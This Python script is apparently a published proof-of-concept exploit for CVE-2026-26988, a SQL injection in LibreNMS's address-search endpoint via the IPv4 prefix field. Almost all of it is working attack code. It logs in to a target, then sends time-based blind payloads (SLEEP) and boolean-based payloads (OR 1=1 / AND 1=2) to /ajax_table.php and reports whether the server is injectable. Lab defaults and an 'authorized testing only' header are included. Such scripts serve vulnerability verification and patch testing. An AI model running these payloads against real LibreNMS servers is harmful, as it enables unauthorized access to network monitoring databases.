#!/usr/bin/env python3
# ──────────────────────────────────────────────────────────────────────
# Exploit Title  : LibreNMS <= 25.12.0 SQL Injection via Address Search
# CVE            : CVE-2026-26988
# Vendor         : librenms
# Product        : LibreNMS
# Affected       : <= 25.12.0 (through 26.1.1)
# Type           : CWE-89 - SQL Injection
# CVSS           : 9.1 (Critical)
# Platform       : Linux
# Author         : Exploit Intelligence Platform
# Website        : https://exploit-intel.com
# Twitter        : @exploit_intel
# Date           : 2026-02-28
#
# For authorized security testing and educational purposes only.
# ──────────────────────────────────────────────────────────────────────
"""
PoC Vector 2 for CVE-2026-26988: IPv4 Path SQL Injection

Demonstrates the SAME vulnerability through the IPv4 code path
(search_type=ipv4) instead of IPv6. This is a separate injection
point in the same file:

    includes/html/table/address-search.inc.php line 34:
        $sql .= " AND ipv4_prefixlen='$prefix'";

This proves both code paths (IPv4 and IPv6) are independently
vulnerable, doubling the attack surface.

Uses both time-based and boolean-based techniques on the IPv4 path.

Usage:
    python3 poc_vector2.py [host] [port] [username] [password]

Defaults:
    host=172.19.0.4, port=8000, username=admin, password=Cvelab2026!sqli
"""

import sys
import os
import time
import json

# Add script directory to path for shared module import
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from librenms_session import authenticate


# --- Configuration ---

DEFAULT_HOST = "172.19.0.4"
DEFAULT_PORT = 8000
DEFAULT_USER = "admin"
DEFAULT_PASS = "Cvelab2026!sqli"

SLEEP_SECONDS = 5
DELAY_THRESHOLD = 4.0


# --- Injection Helpers ---

def send_sqli_request(session, search_type, address_payload):
    """Send injection request to ajax_table.php."""
    return session.post("/ajax_table.php", {
        "id": "address-search",
        "search_type": search_type,
        "address": address_payload,
        "current": "1",
        "rowCount": "10",
    })


# --- IPv4 Tests ---

def test_ipv4_baseline(session):
    """Normal IPv4 search to establish baseline."""
    print("\n" + "=" * 70)
    print("TEST 1: BASELINE REQUEST (IPv4 path, no injection)")
    print("=" * 70)
    payload = "10.0.0.1/24"
    print(f"[*] Sending: search_type=ipv4, address={payload}")

    status, body, elapsed = send_sqli_request(session, "ipv4", payload)
    print(f"    Status: {status} | Time: {elapsed:.3f}s")
    print(f"    Body:   {body[:200]}")

    try:
        data = json.loads(body)
        print(f"    Total:  {data.get('total', '?')} rows")
    except (json.JSONDecodeError, ValueError):
        pass

    return elapsed


def test_ipv4_time_based(session):
    """
    Time-based blind SQLi via the IPv4 path.

    Injection point (line 34):
        $sql .= " AND ipv4_prefixlen='$prefix'";

    Note: Use prefix '1' (not '24') to avoid matching the seeded row's actual
    prefix. If prefix matches a real row, MySQL short-circuits the OR and
    skips SLEEP.

    Payload: 10.0.0.1/1' OR SLEEP(5)-- -
    SQL becomes: ... AND ipv4_prefixlen='1' OR SLEEP(5)-- -'
    """
    print("\n" + "=" * 70)
    print(f"TEST 2: TIME-BASED BLIND SQLi (IPv4 path, SLEEP({SLEEP_SECONDS}))")
    print("=" * 70)

    # Use prefix '1' (not '24') to avoid matching seeded data row prefix
    payload = f"10.0.0.1/1' OR SLEEP({SLEEP_SECONDS})-- -"
    print(f"[*] Injecting via IPv4 prefix")
    print(f"    address param: {payload}")
    print(f"    SQL becomes: AND ipv4_prefixlen='1' OR SLEEP({SLEEP_SECONDS})-- -'")

    status, body, elapsed = send_sqli_request(session, "ipv4", payload)
    print(f"\n    Status: {status} | Time: {elapsed:.3f}s")
    print(f"    Body:   {body[:200]}")

    if elapsed >= DELAY_THRESHOLD:
        print(f"\n[+] VULNERABLE! IPv4 path time-based SQLi confirmed ({elapsed:.2f}s delay)")
        return True
    else:
        print(f"\n[-] No delay detected ({elapsed:.2f}s)")
        return False


def test_ipv4_boolean_based(session):
    """Boolean-based blind SQLi via IPv4 path."""
    print("\n" + "=" * 70)
    print("TEST 3: BOOLEAN-BASED BLIND SQLi (IPv4 path)")
    print("=" * 70)

    # TRUE condition -- use non-matching prefix to avoid short-circuit
    true_payload = "10.0.0.1/1' OR 1=1-- -"
    print(f"[*] TRUE condition: {true_payload}")
    status_t, body_t, elapsed_t = send_sqli_request(session, "ipv4", true_payload)
    total_true = -1
    try:
        data = json.loads(body_t)
        total_true = data.get("total", -1)
        print(f"    Total: {total_true} | Time: {elapsed_t:.3f}s")
    except (json.JSONDecodeError, ValueError):
        print(f"    Response: {body_t[:200]}")

    # FALSE condition
    false_payload = "10.0.0.1/1' AND 1=2-- -"
    print(f"[*] FALSE condition: {false_payload}")
    status_f, body_f, elapsed_f = send_sqli_request(session, "ipv4", false_payload)
    total_false = -1
    try:
        data = json.loads(body_f)
        total_false = data.get("total", -1)
        print(f"    Total: {total_false} | Time: {elapsed_f:.3f}s")
    except (json.JSONDecodeError, ValueError):
        print(f"    Response: {body_f[:200]}")

    if (total_true != total_false and total_true >= 0 and total_false >= 0) or body_t != body_f:
        print(f"\n[+] VULNERABLE! IPv4 boolean-based SQLi confirmed")
        print(f"    TRUE total={total_true} vs FALSE total={total_false}")
        return True
    else:
        print(f"\n[-] Responses identical - inconclusive")
        return False


# --- Main ---

def exploit(host, port, username, password):
    """Run IPv4-path PoC against the target."""
    base_url = f"http://{host}:{port}"

    print("=" * 70)
    print("  CVE-2026-26988: IPv4 Path SQL Injection (Vector 2)")
    print("  Endpoint: /ajax_table.php (address-search, IPv4 prefix)")
    print(f"  Target:   {base_url}")
    print("=" * 70)

    print("\n[*] Phase 1: Authentication")
    session = authenticate(host, port, username, password)
    if session is None:
        print("[-] Authentication failed. Aborting.")
        return False

    baseline = test_ipv4_baseline(session)
    time_result = test_ipv4_time_based(session)
    boolean_result = test_ipv4_boolean_based(session)

    print("\n" + "=" * 70)
    print("RESULTS SUMMARY (IPv4 Vector)")
    print("=" * 70)
    print(f"  Baseline response time:  {baseline:.3f}s")
    print(f"  Time-based SQLi (IPv4):  {'CONFIRMED' if time_result else 'FAILED'}")
    print(f"  Boolean-based SQLi (v4): {'CONFIRMED' if boolean_result else 'FAILED'}")

    if time_result or boolean_result:
        print("\n[+] CVE-2026-26988 CONFIRMED via IPv4 code path!")
        print("    Both IPv4 and IPv6 paths are independently injectable.")
        return True
    else:
        print("\n[-] Could not confirm via IPv4 path")
        return False


if __name__ == "__main__":
    host = sys.argv[1] if len(sys.argv) > 1 else DEFAULT_HOST
    port = int(sys.argv[2]) if len(sys.argv) > 2 else DEFAULT_PORT
    username = sys.argv[3] if len(sys.argv) > 3 else DEFAULT_USER
    password = sys.argv[4] if len(sys.argv) > 4 else DEFAULT_PASS

    success = exploit(host, port, username, password)
    sys.exit(0 if success else 1)
